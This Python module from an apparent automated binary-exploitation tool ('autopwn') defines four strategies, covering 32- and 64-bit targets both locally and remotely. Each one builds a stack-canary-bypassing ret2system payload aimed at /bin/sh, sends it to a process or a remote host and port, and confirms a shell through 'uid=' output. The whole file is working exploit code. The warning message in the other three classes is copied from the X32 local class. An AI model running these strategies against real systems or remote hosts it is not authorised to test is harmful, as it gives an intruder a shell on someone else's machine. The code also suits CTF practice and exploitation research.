"""P7.10 canary_ret2system — ret2system("/bin/sh") with canary bypass.

Mirrors v3.1 ``ret2_system_canary_x32`` (L2641-2658) +
``ret2_system_x64_canary`` (L2660-2688) + remote variants
(L2911, L2930), with v3.1 inline canary leak replaced by
``ctx.canary`` (P5.3 output).

Per ``rebuild.md`` §6.8 P7.10.
"""
from __future__ import annotations

import datetime

from autopwn.context import ExploitContext
from autopwn.core.logging import print_critical, print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.registry import register
from autopwn.exp.strategies._canary_base import CanaryStrategy
from autopwn.primitives.ret2system import Ret2SystemX32, Ret2SystemX64
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


@register
class CanaryRet2SystemX32LocalStrategy(CanaryStrategy):
    """Canary-tainted x32 ret2system — local."""

    name = "canary-ret2system-x32"
    priority = CanaryStrategy.priority
    requires_arch = 32
    requires_remote = False
    requires = ("padding", "has_system")

    def run(self, ctx: ExploitContext) -> bool:
        primitive = Ret2SystemX32()
        primitive_payload = primitive.build_payload(ctx)
        if not primitive_payload:
            print_info("canary-ret2system-x32: primitive returned empty; skipping")
            return False

        from pwn import process

        print_section_header("EXPLOITATION: canary ret2system - x32 Local")
        print_payload("preparing canary + ret2system payload")

        payload = self.frame_after_canary(ctx, primitive_payload)

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(payload)

        info = ExploitInfo(
            exploit_type="canary ret2system - x32",
            payload=payload,
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "canary_diff": ctx.canary.diff,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        from autopwn.report import record_success
        record_success(info)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"CanaryRet2SystemX32LocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


@register
class CanaryRet2SystemX32RemoteStrategy(CanaryStrategy):
    """Canary-tainted x32 ret2system — remote."""

    name = "canary-ret2system-x32-remote"
    priority = CanaryStrategy.priority
    requires_arch = 32
    requires_remote = True
    requires = ("padding", "has_system")

    def run(self, ctx: ExploitContext) -> bool:
        if ctx.remote is None:
            print_info("canary-ret2system-x32-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        primitive = Ret2SystemX32()
        primitive_payload = primitive.build_payload(ctx)
        if not primitive_payload:
            print_info("canary-ret2system-x32-remote: primitive returned empty; skipping")
            return False

        from pwn import remote as pwn_remote

        print_section_header("EXPLOITATION: canary ret2system - x32 Remote")
        print_payload("preparing remote canary + ret2system payload")

        payload = self.frame_after_canary(ctx, primitive_payload)

        io = pwn_remote(host, port)
        io.recv()
        io.sendline(payload)

        info = ExploitInfo(
            exploit_type="canary ret2system - x32 Remote",
            payload=payload,
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "canary_diff": ctx.canary.diff,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        from autopwn.report import record_success
        record_success(info)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"CanaryRet2SystemX32LocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


@register
class CanaryRet2SystemX64LocalStrategy(CanaryStrategy):
    """Canary-tainted x64 ret2system — local."""

    name = "canary-ret2system-x64"
    priority = CanaryStrategy.priority
    requires_arch = 64
    requires_remote = False
    requires = ("padding", "has_system")

    def run(self, ctx: ExploitContext) -> bool:
        primitive = Ret2SystemX64()
        primitive_payload = primitive.build_payload(ctx)
        if not primitive_payload:
            print_info("canary-ret2system-x64: primitive returned empty; skipping")
            return False

        from pwn import process

        print_section_header("EXPLOITATION: canary ret2system - x64 Local")
        print_payload("preparing canary + ret2system payload (x64)")

        payload = self.frame_after_canary(ctx, primitive_payload)

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(payload)

        info = ExploitInfo(
            exploit_type="canary ret2system - x64",
            payload=payload,
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "canary_diff": ctx.canary.diff,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        from autopwn.report import record_success
        record_success(info)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"CanaryRet2SystemX32LocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


@register
class CanaryRet2SystemX64RemoteStrategy(CanaryStrategy):
    """Canary-tainted x64 ret2system — remote."""

    name = "canary-ret2system-x64-remote"
    priority = CanaryStrategy.priority
    requires_arch = 64
    requires_remote = True
    requires = ("padding", "has_system")

    def run(self, ctx: ExploitContext) -> bool:
        if ctx.remote is None:
            print_info("canary-ret2system-x64-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        primitive = Ret2SystemX64()
        primitive_payload = primitive.build_payload(ctx)
        if not primitive_payload:
            print_info("canary-ret2system-x64-remote: primitive returned empty; skipping")
            return False

        from pwn import remote as pwn_remote

        print_section_header("EXPLOITATION: canary ret2system - x64 Remote")
        print_payload("preparing remote canary + ret2system payload (x64)")

        payload = self.frame_after_canary(ctx, primitive_payload)

        io = pwn_remote(host, port)
        io.recv()
        io.sendline(payload)

        info = ExploitInfo(
            exploit_type="canary ret2system - x64 Remote",
            payload=payload,
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "canary_diff": ctx.canary.diff,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        from autopwn.report import record_success
        record_success(info)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"CanaryRet2SystemX32LocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


__all__ = [
    "CanaryRet2SystemX32LocalStrategy",
    "CanaryRet2SystemX32RemoteStrategy",
    "CanaryRet2SystemX64LocalStrategy",
    "CanaryRet2SystemX64RemoteStrategy",
]
